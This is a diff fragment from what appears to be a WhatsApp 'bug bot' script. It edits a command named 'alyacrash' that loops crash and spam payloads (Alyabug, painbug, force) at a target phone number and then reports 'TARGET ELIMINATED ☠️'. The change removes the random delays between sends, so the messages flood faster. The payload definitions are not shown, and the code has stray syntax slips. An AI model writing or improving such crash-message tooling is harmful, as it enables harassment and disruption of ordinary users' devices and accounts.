@@ -20990,47 +20990,21 @@ case "alyacrash": {
     };
 
     for (let j = 0; j < 5; j++) { // Loop 5 times
-        await sendPaymentInfoMessage(whatsappNumber);
-        await randomDelay(3000, 5000); // Random delay between 3 to 5 seconds
-
         await bakdok(whatsappNumber, Alyabug);
-        await randomDelay(2000, 4000); // Random delay between 2 to 4 seconds
-
-        await sendPaymentInfoMessage(whatsappNumber);
-        await randomDelay(2500, 4500); // Random delay between 2.5 to 4.5 seconds
-
-        await sendPaymentInfoMessage(whatsappNumber, force2);
-        await randomDelay(3000, 5000);
-
-        await bakdok(whatsappNumber, Alyabug);
-        await randomDelay(2000, 4000);
-
+         // Random delay between 2 
         await sendPaymentInfoMessage(whatsappNumber, Alyabug);
-        await randomDelay(3000, 5000);
 
-        await penghitaman(whatsappNumber, painbug);
-        await randomDelay(3500, 6000);
-
-        await sendPaymentInfoMessage(whatsappNumber, zpay);
-        await randomDelay(3000, 5000);
+        await penghitaman(whatsappNumber, painbug);;
 
         await iponcrash(whatsappNumber, force);
-        await randomDelay(2500, 4500);
-
-        await sendPaymentInfoMessage(whatsappNumber, painbug);
-        await randomDelay(2000, 4000);
 
         await sendSystemCrashMessage(whatsappNumber, force);
-        await randomDelay(3000, 5000);
 
-        // Continue with similar delays between each action...
-        
-        if (j === 1) {
+         if (j === 1) {
             // Additional logic if needed
         }
     }
-
-    replygcalya(
+  replygcalya(
         "TARGET ELIMINATED ☠️ @" +
         whatsappNumber.split("@")[0] +
         " Using *" +
